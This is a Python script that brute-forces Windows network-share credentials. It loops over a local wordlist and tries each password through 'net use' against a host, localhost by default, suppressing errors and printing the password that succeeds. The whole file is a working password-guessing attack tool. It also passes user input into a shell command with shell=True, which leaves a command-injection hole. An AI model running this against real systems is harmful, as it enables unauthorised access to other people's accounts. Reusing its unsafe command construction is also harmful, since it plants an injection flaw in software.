import os
import subprocess
from pathlib import Path
import time
import sys

ip = 'localhost'
username = input("Input Username: ")

pw_list_path = Path(os.path.join(os.path.dirname(sys.argv[0]), 'wordlist.txt'))

attempt = 0
found_password = False
start_time = time.time() 

def check_password(ip, username, password):
    command = f"net use \\\\{ip} /user:{username} {password}"
    
    # create the command process and dismiss any error or response
    process = subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return process.returncode == 0
try:
    with open(pw_list_path, 'r') as file:
        passwords = [line.strip() for line in file]

        for password in passwords:
            attempt += 1
            if check_password(ip, username, password):
                print(f'Correct Password: {password}')
                found_password = True

                #Automatically remove connection again
                subprocess.run(f"net use \\\\{ip} /d /y", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                break
            else:
                print(f'Try Password: {password}. Not successful. Attempt: {attempt}')

except Exception as e:
    print(f"Error reading password list file: {e}")
    exit(1)

# check total time taken
end_time = time.time()
elapsed_time = round(end_time - start_time, 2)

if not found_password:
    print('No successful match found')

print(f'Total Passwords checked: {attempt} in {elapsed_time} seconds')

input("Press Enter to exit...")
